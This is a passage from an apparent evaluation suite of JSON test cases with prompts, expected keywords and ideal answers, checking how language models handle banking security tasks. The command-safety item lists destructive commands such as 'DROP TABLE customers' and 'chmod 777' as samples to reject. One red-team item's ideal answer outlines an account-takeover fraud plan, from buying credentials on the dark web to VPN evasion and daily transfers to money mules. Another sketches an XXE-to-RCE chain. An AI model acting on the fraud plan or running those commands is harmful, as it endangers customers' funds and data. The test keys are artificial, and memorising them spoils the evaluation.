+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nnmap detailed scan of VPC:\n{\"hosts\": [\n  {\"ip\": \"10.0.0.5\", \"ports\": [{\"port\": 22, \"service\": \"ssh\"}, {\"port\": 80}, {\"port\": 443}, {\"port\": 3389, \"service\": \"rdp\"}]},\n  {\"ip\": \"10.0.0.8\", \"ports\": [{\"port\": 8080}, {\"port\": 5432, \"service\": \"postgresql\"}]},\n  {\"ip\": \"10.0.0.10\", \"ports\": [{\"port\": 3306}, {\"port\": 27017, \"service\": \"mongodb\"}]}\n]}\n\nIdentify all dangerous open ports and generate a prioritised firewall hardening plan.",
+      "expected_keywords_in_response": ["RDP 3389", "ransomware", "MongoDB 27017", "unauthenticated", "PostgreSQL 5432", "MySQL 3306", "SSH 22", "priority", "close", "restrict"],
+      "evaluation_criteria": {
+        "accuracy": "Must flag RDP 3389 and MongoDB 27017 as highest risk",
+        "completeness": "All 7 dangerous ports addressed",
+        "prioritisation": "Correct priority order with attack justification per port"
+      },
+      "ideal_answer_summary": "Priority 1: RDP 3389 (ransomware entry point). Priority 2: MongoDB 27017 (often unauthenticated by default). Priority 3: MySQL 3306 (internal only). Priority 4: PostgreSQL 5432 (internal only). Priority 5: SSH 22 (restrict to management IPs). Close or restrict all."
+    },
+
+    {
+      "id": "TC-072",
+      "category": "pre_filter_triage",
+      "difficulty": "easy",
+      "ps_requirement": "PS#5",
+      "model_target": "llama-3.1-8b-instant",
+      "platform": "groq",
+      "prompt": "You are a security triage system. Quickly determine if this Nessus scan finding needs immediate escalation or can wait for routine processing. Respond in JSON only.\n\nFinding: {\"cve\": \"CVE-2021-44228\", \"severity\": \"Critical\", \"cvss\": 10.0, \"host\": \"10.0.0.5\", \"service\": \"Apache Log4j\", \"exploit_available\": true}\n\nRespond: {\"suspicious\": bool, \"confidence\": float, \"reason\": str, \"escalate\": bool, \"urgency\": \"routine|urgent|emergency\"}",
+      "expected_keywords_in_response": ["suspicious", "true", "CVSS 10", "Log4Shell", "exploit available", "escalate", "true", "emergency", "confidence"],
+      "evaluation_criteria": {
+        "accuracy": "Must classify as emergency — CVSS 10.0 with public exploit = maximum urgency",
+        "format": "Valid JSON with all 5 fields including urgency",
+        "reasoning": "Must justify emergency classification"
+      },
+      "ideal_answer_summary": "suspicious: true, confidence: 1.0, reason: CVSS 10.0 Log4Shell with public exploit = maximum severity, escalate: true, urgency: emergency"
+    },
+
+    {
+      "id": "TC-073",
+      "category": "real_time_scoring",
+      "difficulty": "easy",
+      "ps_requirement": "PS#1",
+      "model_target": "llama-3.1-8b-instant",
+      "platform": "groq",
+      "prompt": "You are a real-time threat scoring engine for a bank dashboard. Update the threat score for a new finding. Respond in JSON only.\n\nCurrent score: 45\nNew finding: {\"source\": \"Nessus\", \"cve\": \"CVE-2021-44228\", \"severity\": \"Critical\", \"cvss\": 10.0, \"host\": \"web-server\"}\n\nRespond: {\"new_score\": int, \"delta\": int, \"reason\": str, \"alert_level\": \"safe|warning|critical\"}",
+      "expected_keywords_in_response": ["new_score", "delta", "Log4Shell", "critical", "CVSS 10", "alert_level", "reason"],
+      "evaluation_criteria": {
+        "accuracy": "Score must jump significantly — CVSS 10.0 on production web server should push to critical",
+        "format": "Valid JSON",
+        "threshold": "alert_level must be critical given CVSS 10.0"
+      },
+      "ideal_answer_summary": "new_score: 85-95, delta: +40-50, reason: CVSS 10.0 Log4Shell on web server = maximum severity vulnerability, alert_level: critical"
+    },
+
+    {
+      "id": "TC-074",
+      "category": "safety_verification",
+      "difficulty": "medium",
+      "ps_requirement": "PS#7",
+      "model_target": "nemotron-content-safety-reasoning-4b",
+      "platform": "nvidia_nim",
+      "prompt": "You are a security playbook safety verifier for a production banking server. Assess this remediation batch and flag any dangerous commands. Respond JSON array.\n\nCommands:\n1. \"systemctl restart apache2\"\n2. \"DROP TABLE customers\"\n3. \"fail2ban-client set sshd banip 185.220.101.45\"\n4. \"chmod 777 /var/www/html/\"\n5. \"ufw deny from 185.220.101.45 to any\"\n\nFor each: {\"cmd_id\": int, \"safe\": bool, \"risk\": str, \"concern\": str or null, \"approved\": bool}",
+      "expected_keywords_in_response": ["DROP TABLE", "false", "data loss", "chmod 777", "security risk", "approved false", "restart", "fail2ban", "ufw deny", "approved true"],
+      "evaluation_criteria": {
+        "accuracy": "Must reject: 2 (DROP TABLE = data loss), 4 (chmod 777 = world-writable security hole)",
+        "completeness": "All 5 assessed",
+        "reasoning": "Must clearly explain why dangerous commands are rejected"
+      },
+      "ideal_answer_summary": "1: approved (safe restart). 2: NOT APPROVED — destroys customer database. 3: approved (targeted IP ban). 4: NOT APPROVED — world-writable web directory = major security hole. 5: approved (targeted IP block)."
+    },
+
+    {
+      "id": "TC-075",
+      "category": "red_team_mitre",
+      "difficulty": "hard",
+      "ps_requirement": "PS#11",
+      "model_target": "nemotron-3-super-120b-a12b",
+      "platform": "nvidia_nim",
+      "prompt": "You are a red team AI. Simulate an impossible travel / account takeover attack on an Altoro Mutual banking customer account.\n\nAvailable intelligence: {\"target_account\": \"cust_7821\", \"credentials_from\": \"dark web purchase\", \"balance\": 85000, \"transfer_limit\": 10000, \"mfa\": false, \"no_geo_restrictions\": true}\n\nSimulate the full attack from credential purchase to fund theft. Include timing, detection evasion, and blue team detection opportunities.",
+      "expected_keywords_in_response": ["credential purchase", "VPN", "account login", "transfer limit", "10000", "daily limit", "multiple days", "detection evasion", "blue team", "impossible travel", "geo-block"],
+      "evaluation_criteria": {
+        "accuracy": "Must model realistic account takeover with daily limits",
+        "completeness": "Full attack from credential purchase to max fund extraction",
+        "evasion": "Must include VPN/proxy use to evade geo-detection"
+      },
+      "ideal_answer_summary": "Day 1: Purchase creds from dark web. Use VPN near victim's city. Login, change contact info. Transfer $10K (daily limit). Day 2-3: Transfer $10K/day to money mule. Blue team opportunity: new login device fingerprint, contact info change, unusual transfer pattern. Total extracted: $30K over 3 days before detection."
+    },
+
+    {
+      "id": "TC-076",
+      "category": "attack_path_analysis",
+      "difficulty": "medium",
+      "ps_requirement": "PS#5",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nSpiderFoot OSINT on altoro.com:\n{\"findings\": [\n  {\"type\": \"EMPLOYEE_INFO\", \"data\": \"CFO email john.smith@altoro.com found on LinkedIn\"},\n  {\"type\": \"SHADOW_IT\", \"data\": \"admin.altoro.com resolves to unregistered 10.0.0.99\"},\n  {\"type\": \"SSL_EXPIRED\", \"data\": \"api.altoro.com cert expired 45 days ago\"}\n]}\nIncidents: [{\"type\": \"spear_phishing\", \"target\": \"CFO\", \"status\": \"blocked\"}, {\"type\": \"dns_lookup\", \"query\": \"admin.altoro.com\", \"source\": \"external\"}]\n\nWhat attack is being prepared and who is the target?",
+      "expected_keywords_in_response": ["CFO", "whaling", "BEC", "business email compromise", "admin subdomain", "shadow IT", "expired SSL", "MitM", "coordinated", "wire transfer"],
+      "evaluation_criteria": {
+        "accuracy": "Must identify whaling/BEC attack targeting CFO for fraudulent wire transfer",
+        "completeness": "Must flag shadow IT subdomain and expired cert as additional risks",
+        "intelligence": "Must connect spear phish attempt + DNS lookup as coordinated campaign"
+      },
+      "ideal_answer_summary": "Business Email Compromise (whaling) targeting CFO for fraudulent wire transfer. Evidence: spear phish attempt + DNS lookup of admin subdomain = reconnaissance. Shadow IT subdomain = unknown attack surface. Expired SSL on api = MitM risk. Coordinated targeted campaign."
+    },
+
+    {
+      "id": "TC-077",
+      "category": "vulnerability_analysis",
+      "difficulty": "medium",
+      "ps_requirement": "PS#2",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nZAP and Nessus combined:\nZAP: {\"alert\": \"XML External Entity Injection\", \"risk\": \"Critical\", \"url\": \"/api/transfer/xml\", \"param\": \"transaction_data\"}\nNessus: {\"cve\": \"CVE-2019-3396\", \"service\": \"Confluence\", \"severity\": \"Critical\", \"host\": \"10.0.0.30\"}\n\nThe bank uses XML for transaction processing. Explain the combined risk.",
+      "expected_keywords_in_response": ["XXE", "XML external entity", "SSRF", "Confluence", "CVE-2019-3396", "transaction", "lateral movement", "combined", "file disclosure", "server side"],
+      "evaluation_criteria": {
+        "accuracy": "Must explain XXE in banking transaction XML context + Confluence CVE combination",
+        "completeness": "Must explain how vulnerabilities chain",
+        "technical": "Must demonstrate understanding of XXE → SSRF → Confluence exploitation chain"
+      },
+      "ideal_answer_summary": "XXE on /api/transfer allows file disclosure and SSRF attacks via transaction XML. Combined with CVE-2019-3396: SSRF from XXE reaches Confluence server, exploits Confluence CVE for RCE. Full internal network access via a legitimate-looking transaction request."
+    },
+
+    {
+      "id": "TC-078",
+      "category": "config_recommendations",
+      "difficulty": "hard",
+      "ps_requirement": "PS#10",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nFull system hardening audit:\n{\"tls\": \"TLS 1.0 and 1.1 enabled, TLS 1.2 optional\", \"ciphers\": [\"RC4\", \"DES\", \"3DES\", \"AES-128\"], \"cert\": \"SHA-1 signed, expires in 12 days\", \"ssh\": \"password auth enabled, root login permitted\", \"mysql\": \"runs as root, remote root login enabled\", \"php\": \"version 5.6 EOL\", \"apache\": \"version 2.2 EOL, mod_status exposed at /server-status\"}\n\nGenerate complete configuration hardening guide with specific commands for each finding.",
+      "expected_keywords_in_response": ["TLS 1.2", "TLS 1.3 only", "disable RC4", "SHA-256", "PermitRootLogin no", "PasswordAuthentication no", "MySQL non-root", "PHP 8", "Apache 2.4", "mod_status disable", "12 days"],
+      "evaluation_criteria": {
+        "accuracy": "Correct values for each configuration",
+        "completeness": "All 7 findings addressed",
+        "commands": "Must include actual config commands or file references"
+      },
+      "ideal_answer_summary": "SSL: TLS 1.2/1.3 only, disable RC4/DES/3DES, renew cert with SHA-256 URGENT (12 days). SSH: PermitRootLogin no, PasswordAuthentication no (keys only). MySQL: create non-root user, disable remote root. PHP: upgrade to 8.2+. Apache: upgrade to 2.4, disable mod_status."
+    },
+
+    {
+      "id": "TC-079",
+      "category": "threat_landscape",
+      "difficulty": "easy",
+      "ps_requirement": "PS#1",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nSpiderFoot OSINT scan on altoro.com:\n{\"findings\": [\n  {\"type\": \"EMAIL_ADDRESSES\", \"data\": \"38 employee emails found publicly on LinkedIn\"},\n  {\"type\": \"TECHNOLOGY\", \"data\": \"WordPress 4.9 detected on blog.altoro.com\"},\n  {\"type\": \"WILDCARD_CERT\", \"data\": \"*.altoro.com wildcard certificate found\"}\n]}\n\nAssess the external attack surface based on these OSINT findings.",
+      "expected_keywords_in_response": ["attack surface", "38 employees", "social engineering", "WordPress 4.9", "outdated", "CVE", "wildcard certificate", "all subdomains", "exposure"],
+      "evaluation_criteria": {
+        "accuracy": "Must identify WordPress 4.9 as outdated with known CVEs",
+        "completeness": "Must assess all 3 OSINT findings for attack surface value",
+        "insight": "Must explain wildcard cert risk — if compromised affects all subdomains"
+      },
+      "ideal_answer_summary": "38 emails = large social engineering surface for phishing. WordPress 4.9 = multiple known CVEs (EOL version). Wildcard cert: if private key compromised, attacker can impersonate any *.altoro.com subdomain. Attack surface rating: High."
+    },
+
+    {
+      "id": "TC-080",
+      "category": "defense_gap",
+      "difficulty": "hard",
+      "ps_requirement": "PS#12",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nPost-incident analysis — Kill Switch was deployed successfully. Now assess what systemic gaps allowed the attack to occur in the first place:\n{\"attack_succeeded_for_minutes\": 23, \"detection_method\": \"customer complaint\", \"controls_that_failed\": [\"no WAF\", \"no IDS\", \"no real-time monitoring\"], \"controls_that_worked\": [\"Kill Switch once activated\", \"firewall IP block\"], \"data_exposed\": 4500}\n\nGenerate a systemic gap analysis and 90-day improvement roadmap.",
+      "expected_keywords_in_response": ["systemic gaps", "customer complaint", "detection failure", "23 minutes", "WAF deployment", "IDS", "SIEM", "90-day roadmap", "Month 1", "Month 2", "Month 3"],
+      "evaluation_criteria": {
+        "accuracy": "Must identify detection via customer complaint (not automated) as primary gap",
+        "completeness": "All failed controls addressed + 90-day roadmap with monthly milestones",
+        "roadmap": "90-day roadmap must be specific and executable"
+      },
+      "ideal_answer_summary": "Primary gap: no automated detection — discovered via customer complaint after 23 minutes. Month 1: Deploy WAF + IDS signatures. Month 2: SIEM + automated alerting. Month 3: Threat hunting capability + purple team exercise. Target: MTTD <5 minutes."
+    }
+
+  ]
+}
